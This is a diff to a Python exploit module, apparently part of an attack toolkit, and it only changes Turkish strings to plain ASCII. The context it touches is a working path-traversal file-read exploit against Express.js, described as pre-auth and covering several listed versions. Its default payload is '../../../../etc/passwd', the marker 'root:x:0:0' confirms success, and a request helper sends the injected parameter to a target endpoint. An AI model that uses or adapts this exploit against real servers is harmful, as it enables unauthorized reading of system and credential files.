@@ -32,7 +32,7 @@ def _send(params, query_value, timeout=15):
     """GET (or POST) the endpoint with `param=<query_value>`. Returns (status, body)."""
     url = (params.get("url") or params.get("host") or "").strip()
     if not url:
-        raise ValueError("hedef url gerekli (örn. http://127.0.0.1:3000/read)")
+        raise ValueError("hedef url gerekli (orn. http://127.0.0.1:3000/read)")
     t = _resolve(url)
     method = (params.get("method") or "GET").upper()
     param = params.get("param") or "file"
@@ -88,7 +88,7 @@ _INPUTS = [
     _in("Hedef URL (endpoint)", "url", True, "", "http://127.0.0.1:3000/read"),
     _in("Enjekte parametresi", "param", False, "file", "file"),
     _in("Okunacak dosya", "path", False, "../../../../etc/passwd", "../../../../etc/passwd"),
-    _in("Başarım kanıtı (ops.)", "marker", False, "", "root:x:0:0"),
+    _in("Basarim kaniti (ops.)", "marker", False, "", "root:x:0:0"),
     _in("Metot", "method", False, "GET", "GET"),
 ]
 
@@ -98,8 +98,8 @@ EXPLOITS = {
         "name": "Express.js path traversal LFI (file read)",
         "type": "LFI", "preauth": True,
         "affected": ["4.18.2", "4.19.1", "4.20.0", "4.21.0"],
-        "note": ("Node/Express path traversal (CWE-22): kullanıcı kontrollü `file`/path parametresi "
-                 "doğrudan dosya okumaya gider. Kanıt = hassas dosyanın gerçek içeriği (örn. /etc/passwd)."),
+        "note": ("Node/Express path traversal (CWE-22): kullanici kontrollu `file`/path parametresi "
+                 "dogrudan dosya okumaya gider. Kanit = hassas dosyanin gercek icerigi (orn. /etc/passwd)."),
         "inputs": list(_INPUTS),
         "run": lfi,
     },
